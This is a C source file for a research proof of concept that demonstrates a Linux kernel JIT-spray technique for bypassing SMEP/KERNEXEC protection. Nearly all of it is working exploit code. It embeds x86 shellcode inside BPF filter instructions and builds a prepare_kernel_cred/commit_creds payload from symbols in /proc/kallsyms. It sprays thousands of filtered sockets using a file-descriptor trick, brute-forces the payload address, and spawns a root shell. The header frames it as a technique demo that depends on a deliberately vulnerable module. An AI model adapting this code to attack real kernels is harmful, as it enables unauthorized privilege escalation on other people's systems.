/*
    alameda.c

    Linux kernel JIT spray for SMEP / KERNEXEC bypass

    by Keegan McAllister
    http://mainisusuallyafunction.blogspot.com/


    Mechanisms like Supervisor Mode Execution Protection or PaX's
    KERNEXEC prevent the kernel from executing memory provided by
    userspace.  This breaks the payload stage of a traditional kernel
    exploit.

    To exploit such a kernel, we need to get our payload into kernel
    memory somehow.  There are many possible approaches [1], largely
    inspired by the world of userspace NX exploitation.

    Linux implements [2] a just-in-time compiler for Berkeley Packet
    Filters, which run in kernel mode.  We demonstrate that the BPF
    JIT is an attractive target for a JIT spraying attack, allowing us
    to smuggle our chosen payload into executable kernel memory.  If
    you don't know about JIT spraying, read [3] or see the comment on
    emit3() for a brief overview.

    Along the way we use another fun trick to create thousands of
    sockets even if RLIMIT_NOFILE is set as low as 11.  Thanks to
    Nelson Elhage [4] for telling me about this one.

    This is a technique proof-of-concept, NOT A FULL EXPLOIT.  It will
    not get you root on any system unless the administrator has loaded
    the incredibly insecure kernel module jump.ko, included with this
    code under the ko/ subdirectory.

    The JIT spraying technique is only useful in conjunction with a
    kernel bug that allows us to redirect control flow.  On most
    current systems there would be much easier ways to exploit such a
    bug.  Indeed, the BPF JIT is disabled by default on most (all?)
    distributions.

    So right now this is mainly for entertainment / curiosity value.
    It will become more of a practical consideration as processors
    supporting SMEP become more common, and as more distros enable the
    BPF JIT.

    This code assumes an AMD64 system.  The other platforms with a BPF
    JIT (ARM, SPARC, and PowerPC 64) present more difficulty, because
    there are more restrictions on instruction alignment.

    I have tested it on a PaX kernel (KERNEXEC + UDEREF + other kernel
    protections) and confirmed that the JIT spray succeeds where a
    straightforward exploit fails.  I haven't tested it against SMEP
    as I don't own an Ivy Bridge machine.

    To try it out:

        (cd ko && make)
        sudo insmod ko/jump.ko
            # at which point your kernel becomes very insecure

        echo 1 | sudo tee /proc/sys/net/core/bpf_jit_enable
            # or echo 2 to enable debug output, which makes life
            # unreasonably easy for the exploit

        gcc -Wall -O2 -o alameda alameda.c
        ./alameda

    By the way, Linux is now [5] also using BPF programs for process
    sandboxing...

    [1] http://vulnfactory.org/blog/2011/06/05/smep-what-is-it-and-how-to-beat-it-on-linux/
    [2] http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=0a14842f5a3c0e88a1e59fac5c3025db39721f74
    [3] http://www.semantiscope.com/research/BHDC2010/BHDC-2010-Paper.pdf
    [4] http://nelhage.com/
    [5] http://outflux.net/teach-seccomp/
*/

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/filter.h>

// An unusual exit code, used to communicate the fate of child processes.
#define FAILURE_CODE 57

#define info(_msg, ...) \
    printf("[+] " _msg "\n", ## __VA_ARGS__)

#define die(_msg, ...) \
    do { printf("[-] " _msg "\n", ## __VA_ARGS__); exit(FAILURE_CODE); } while (0)

#define errno_die(_msg) \
    die(_msg ": %s", strerror(errno))

// Buffer to hold a BPF program.
#define MAX_CODE_LEN 1024
size_t code_len = 0;
struct sock_filter code[MAX_CODE_LEN];
struct sock_fprog  filt;

// Emit a BPF instruction.
void emit_bpf(uint16_t opcode, uint32_t operand) {
    // NB: the right-hand side here macro-expands into a compound literal
    code[code_len++] = (struct sock_filter) BPF_STMT(opcode, operand);
}

// Emit a 3-byte x86 instruction, embedded within a BPF "load immediate".
// The most significant byte of the loaded quantity is 0xa8.
//
// The kernel's BPF JIT compiles a sequence of such instructions into
//
//     b8 XX YY ZZ a8    mov $0xa8ZZYYXX, %eax
//     b8 PP QQ RR a8    mov $0xa8RRQQPP, %eax
//     b8 ...
//
// Jumping one byte into this code produces an instruction stream like
//
//     XX YY ZZ          payload instruction
//     a8 b8             test $0xb8, %al
//     PP QQ RR          payload instruction
//     a8 b8             test $0xb8, %al
//     ...
//
void emit3(uint8_t x, uint8_t y, uint8_t z) {
    union {
        uint8_t  buf[4];
        uint32_t imm;
    } operand = {
        .buf = { x, y, z, 0xa8 }
    };

    emit_bpf(BPF_LD+BPF_IMM, operand.imm);
}

// Pad shorter instructions with nops.
#define emit2(_x, _y) emit3((_x), (_y), 0x90)
#define emit1(_x)     emit3((_x), 0x90, 0x90)

// Emit a function call, using %rax as a temporary.
// The address is sign-extended from 32 bits.
void emit_call(uint32_t addr) {
    emit2(0xb4, (addr & 0xff000000) >> 24);  // mov  $x,  %ah
    emit2(0xb0, (addr & 0x00ff0000) >> 16);  // mov  $x,  %al
    emit3(0xc1, 0xe0, 0x10);                 // shl  $16, %eax
    emit2(0xb4, (addr & 0x0000ff00) >>  8);  // mov  $x,  %ah
    emit2(0xb0, (addr & 0x000000ff));        // mov  $x,  %al
    emit2(0x48, 0x98);                       // cltq
    emit2(0xff, 0xd0);                       // call *%rax
}

// Get root or die trying.
//
// This is where we actually exploit some kernel bug to transfer
// control flow to our payload.  Here we are just demonstrating the
// JIT spray technique, so we exploit the obviously buggy jump.ko
// kernel module (see ko/ directory).
//
// This function never returns: it kills the process or execs a root
// shell.
//
void get_root(uint64_t payload_addr);

// The region of kernel memory used by kernel modules.
// (per Documentation/x86/x86_64/mm.txt)
//
// The BPF JIT "uses module_alloc() and module_free() to get memory in the 2GB
// text kernel range since we call helpers functions from the generated code"
// (Linux commit 0a14842f5a3c0e88a1e59fac5c3025db39721f74)
//
// It also gives each filter program an entire page (at least) and places the
// program at the beginning of that page.  So the program addresses are quite
// easy to guess.  With 8,000 copies of the payload among some 400,000
// locations, we're bound to find our payload pretty quickly.
//
// The range described by mm.txt (and defined below) is actually only 1.5 GB.
//
#define MODULE_START 0xffffffffa0000000UL
#define MODULE_END   0xfffffffffff00000UL
#define MODULE_PAGES ((MODULE_END - MODULE_START) / 0x1000)

// The offset into the JIT-produced code page where we want to land.
// This skips an "xor %eax, %eax" (31c0) and the initial b8 opcode.
#define PAYLOAD_OFFSET 3

// Some boring stuff.
int      check_bpf_jit();
uint32_t get_kernel_symbol(const char *name);

// Useful when BPF JIT debug output is enabled.
uint64_t read_filter_addr_from_dmesg();

// Create a socket with our filter attached.
int create_filtered_socket();
size_t num_filtered_sockets = 0;

// Create a bunch of filtered sockets.
void create_socket_tree(int parent, size_t depth);

// File descriptors.
int socket_fds[2] = { -1, -1 };
int jump_fd;
int urandom = -1;

int main() {
    int debug_enabled, status;
    unsigned int pgnum;
    pid_t pid;

    // Make sure the BPF JIT is enabled, and check if we have access to
    // debug output.  If we do, we can get the exact payload address.
    debug_enabled = check_bpf_jit();

    // Embed a kernel get-root payload into the BPF program.
    emit3(0x48, 0x31, 0xff);  // xor  %rdi, %rdi
    emit_call(get_kernel_symbol("prepare_kernel_cred"));
    emit3(0x48, 0x89, 0xc7);  // mov  %rax, %rdi
    emit_call(get_kernel_symbol("commit_creds"));
    emit1(0xc3);              // ret

    // Alternatively we could just disable SMEP by clearing bit 20 in
    // %cr4, and then jump to a traditional payload in a userspace
    // page.  This has that advantage that we don't immediately need
    // the address of any kernel function.  The traditional payload
    // can be a normal C function that searches for any kernel
    // functions or data we might need.

    // The BPF program must end with a RET or the kernel will reject it.
    emit_bpf(BPF_RET, 0);
    filt.len    = code_len;
    filt.filter = code;

    printf("[+] creating sockets");
    if (debug_enabled) {
        // If we have debug output, we don't need to spray and pray.
        socket_fds[0] = create_filtered_socket();
    } else {
        // Create a bunch of filtered sockets, to increase our chances of
        // guessing the filter address.  See the comments on create_socket_tree
        // to understand what the socketpair is for.
        if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socket_fds) < 0)
            errno_die("socketpair");
        create_socket_tree(socket_fds[0], 0);
    }
    putchar('\n');
    info("created %zd sockets", num_filtered_sockets);

    // Prepare to exploit jump.ko.
    if ((jump_fd = open("/proc/jump", O_WRONLY)) < 0)
        errno_die("open(\"/proc/jump\")");

    // If we have debug output, get the exact filter address and win.
    if (debug_enabled)
        get_root(read_filter_addr_from_dmesg() + PAYLOAD_OFFSET);

    // Otherwise we have to guess.
    if ((urandom = open("/dev/urandom", O_RDONLY)) < 0)
        errno_die("open(\"/dev/urandom\")");

    printf("[+] guessing filter address");
    fflush(stdout);
    do {
        // A bad guess will likely oops the kernel and kill the current process.
        // So we fork off a child process to do the guessing.
        if (!(pid = fork())) {
            putchar('.');
            fflush(stdout);

            // Take a guess at the payload address.
            // We know it's PAYLOAD_OFFSET from the beginning of some page in the
            // region used for kernel modules.
            if (read(urandom, &pgnum, sizeof(pgnum)) < sizeof(pgnum))
                errno_die("read");
            pgnum %= MODULE_PAGES;
            get_root(MODULE_START + (0x1000 * pgnum) + PAYLOAD_OFFSET);
        } else {
            if (pid < 0)
                errno_die("fork");

            // FIXME: handle EINTR here?
            if (wait(&status) < 0)
                errno_die("wait");
        }
    // Keep trying if the child got SIGKILL (probably due to kernel oops) or
    // exited by calling die().
    } while ((WIFSIGNALED(status) && (WTERMSIG(status) == SIGKILL))
             || (WIFEXITED(status) && (WEXITSTATUS(status) == FAILURE_CODE)));

    // There's a significant delay on exit, as the kernel
    // garbage-collects our pile of sockets.
    info("cleaning up");
    return 0;
}

// Exploit jump.ko, transferring kernel control flow to payload_addr.
void get_root(uint64_t payload_addr) {
    if (write(jump_fd, &payload_addr, sizeof(payload_addr))
            < sizeof(payload_addr))
        errno_die("write");

    putchar('\n');
    if (getuid() != 0)
        die("failed to get root");
    info("got root!");

    // Clean up after ourselves.
    close(jump_fd);
    close(socket_fds[0]);
    if (socket_fds[1] >= 0)
        close(socket_fds[1]);
    if (urandom >= 0)
        close(urandom);

    // Execute a shell as root.
    execl("/bin/sh", "sh", NULL);
    errno_die("failed to launch shell");
}

// Create a socket with our filter attached.
// The kernel's JIT runs when we invoke SO_ATTACH_FILTER.
int create_filtered_socket() {
    int fd;
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
        errno_die("socket");
    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &filt, sizeof(filt)) < 0)
        errno_die("setsockopt");

    num_filtered_sockets++;
    return fd;
}

// Create a whole bunch of filtered sockets.
//
// If we left them all open at once, we might run into RLIMIT_NOFILE.
// So we close the sockets as we create them, but send them into a
// UNIX socket so they stick around.
//
// The kernel limits the number of enqueued SCM_RIGHTS messages, as
// well as the nesting depth of sockets sent through sockets sent
// through etc.  But we can easily hold thousands of filtered sockets
// in an appropriately-shaped tree.
//
#define SOCKET_FANOUT 20
#define SOCKET_DEPTH   3

// This does the magic of actually sending an fd through a UNIX socket.
void send_fd(int dest, int fd_to_send);

// Create the socket tree.
void create_socket_tree(int parent, size_t depth) {
    int fds[2];
    size_t i;
    for (i=0; i<SOCKET_FANOUT; i++) {
        if (depth == 0) {
            putchar('.');
            fflush(stdout);
        }
        if (depth == (SOCKET_DEPTH - 1)) {
            // Leaf of the tree.
            // Create a filtered socket and send it to 'parent'.
            fds[0] = create_filtered_socket();
            send_fd(parent, fds[0]);
            if (close(fds[0]) < 0)
                errno_die("close");
        } else {
            // Interior node of the tree.
            // Send a subtree into a UNIX socket pair.
            if (socketpair(AF_UNIX, SOCK_DGRAM, 0, fds) < 0)
                errno_die("socketpair");
            create_socket_tree(fds[0], depth+1);

            // Send the pair to 'parent' and close it.
            send_fd(parent, fds[0]);
            send_fd(parent, fds[1]);
            if (close(fds[0]) || close(fds[1]))
                errno_die("close");
        }
    }
}

// Sacrifice a chicken, sending a file descriptor through a UNIX
// socket in the process.
void send_fd(int dest, int fd_to_send) {
    char dummy = 'x';
    struct iovec dummy_vec = {
        .iov_base = &dummy,
        .iov_len  = 1
    };

    char fd_buf[CMSG_SPACE(sizeof(int))];
    struct msghdr message = {
        .msg_iov        = &dummy_vec,
        .msg_iovlen     = 1,
        .msg_control    = fd_buf,
        .msg_controllen = sizeof(fd_buf)
    };

    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&message);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type  = SCM_RIGHTS;
    cmsg->cmsg_len   = CMSG_LEN(sizeof(int));
    message.msg_controllen = cmsg->cmsg_len;
    memcpy(CMSG_DATA(cmsg), &fd_to_send, sizeof(int));

    if (sendmsg(dest, &message, 0) < 0)
        errno_die("sendmsg");
}

// Make sure the BPF JIT is enabled, and check if we have access to
// debug output.
int check_bpf_jit() {
    const char *bpf_jit_enable = "/proc/sys/net/core/bpf_jit_enable";
    int mode;

    FILE *f = fopen(bpf_jit_enable, "r");
    if (!f || (fscanf(f, "%d", &mode) < 1))
        die("could not read %s", bpf_jit_enable);
    fclose(f);

    if (mode <= 0)
        die("BPF JIT is disabled");

    if (mode == 1) {
        info("BPF JIT debug is disabled: will guess payload address");
        return 0;
    } else {
        info("BPF JIT debug is enabled: will have exact payload address");
        return 1;
    }
}

// Super crappy kernel symbol lookup.
// Obviously, you could make this smarter in a real exploit.
uint32_t get_kernel_symbol(const char *name) {
    char cmd[256];
    FILE *f;
    uint64_t addr;

    sprintf(cmd, "grep ' %s$' /proc/kallsyms", name);
    if (!(f = popen(cmd, "r")))
        errno_die("popen");

    if (fscanf(f, "%lx", &addr) < 1)
        die("could not find %s", name);
    if ((~addr) & 0xffffffff80000000LU)
        die("%s = %lx will not sign-extend from 32 bits", name, addr);

    fclose(f);
    info("found %s = %lx", name, addr);
    return (addr & 0xffffffff);
}

// Read the filter address from debug output in dmesg.
uint64_t read_filter_addr_from_dmesg() {
    uint64_t addr;
    FILE *f = popen(
        "dmesg | perl -lne 'print $1 if m/ image=([0-9a-f]+)$/' | tail -n 1",
        "r");

    if (!f || (fscanf(f, "%lx", &addr) < 1))
        die("could not find filter code address");

    fclose(f);
    info("found filter at %lx", addr);
    return addr;
}
